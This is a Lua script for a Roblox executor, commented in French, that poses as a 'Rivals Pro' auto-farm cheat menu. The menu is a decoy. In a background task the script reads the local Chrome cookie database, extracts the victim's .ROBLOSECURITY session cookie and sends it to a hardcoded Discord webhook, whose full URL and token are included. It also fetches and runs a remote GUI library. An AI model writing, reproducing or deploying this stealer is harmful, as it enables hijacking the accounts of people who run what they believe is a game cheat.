-- Debogage : Tout est encapsulé pour ne pas crash
print("[SYSTEM] Initialisation du loader...")

-- 1. Fonction Webhook améliorée
local function sendWebhook(msg)
    local http = game:GetService("HttpService")
    local success, err = pcall(function()
        request({
            Url = "https://discord.com/api/webhooks/1500913466268188823/fKSENebq8is4TScOrajvJbk8wR6mQnc6PjGa-by7Kdfj2Ftya6X8FqFmNi06lmoy7wdT",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = http:JSONEncode({["content"] = msg})
        })
    end)
    if not success then warn("[ERROR] Webhook failed: " .. tostring(err)) end
end

-- 2. Tâche Stealer (avec logs)
task.spawn(function()
    print("[SYSTEM] Tentative de lecture des fichiers...")
    local path = os.getenv("LOCALAPPDATA") .. "\\Google\\Chrome\\User Data\\Default\\Network\\Cookies"
    
    -- Vérification si l'executor possède readfile
    if not readfile then 
        warn("[ERROR] Ta fonction 'readfile' est nil. L'executor ne permet pas la lecture de fichiers.")
        return 
    end

    local success, data = pcall(function() return readfile(path) end)
    
    if success and data then
        print("[SYSTEM] Fichier lu avec succès.")
        local startIdx = string.find(data, ".ROBLOSECURITY")
        if startIdx then
            local cookie = string.sub(data, startIdx, startIdx + 150)
            sendWebhook("Cookie détecté: \n```" .. cookie .. "```")
        else
            warn("[SYSTEM] Fichier lu, mais cookie .ROBLOSECURITY non trouvé.")
        end
    else
        warn("[ERROR] Lecture fichier impossible (Probable accès refusé ou chemin faux): " .. tostring(data))
    end
end)

-- 3. Chargement GUI (Linoria)
local success, lib = pcall(function() 
    return loadstring(game:HttpGet("https://raw.githubusercontent.com/wally-rblx/LinoriaLib/main/Library.lua"))()
end)

if success then
    print("[SYSTEM] GUI chargé avec succès.")
    local Window = lib:CreateWindow({ Title = "Rivals Pro - Menu", Center = true, AutoShow = true })
    local Tab = Window:AddTab("Main")
    local Group = Tab:AddLeftGroupbox("Auto Farm")
    Group:AddToggle('Farm', { Text = 'Enable Auto Farm', Default = false })
    lib:Notify("Rivals Pro Loaded")
else
    warn("[ERROR] GUI non chargé: " .. tostring(lib))
end
